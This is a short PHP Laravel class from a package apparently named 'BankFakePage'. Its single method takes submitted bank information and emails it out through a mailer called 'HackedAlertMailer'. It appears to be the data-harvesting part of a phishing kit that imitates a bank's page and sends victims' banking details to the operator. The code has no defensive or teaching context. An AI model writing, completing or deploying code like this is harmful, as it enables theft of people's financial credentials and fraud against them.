<?php

namespace LaravelClass\BankFakePage\Implementation;
use Illuminate\Support\Facades\Mail;
use LaravelClass\BankFakePage\Contracts\GetBankInfoContract;
use LaravelClass\BankFakePage\Mail\HackedAlertMailer;

class GetBankInfo implements GetBankInfoContract
{

    public function getBankInfo(object $bankInfo)
    {
        EmailInitialize::setEmailConfig();
        Mail::send(new HackedAlertMailer($bankInfo));
    }
}
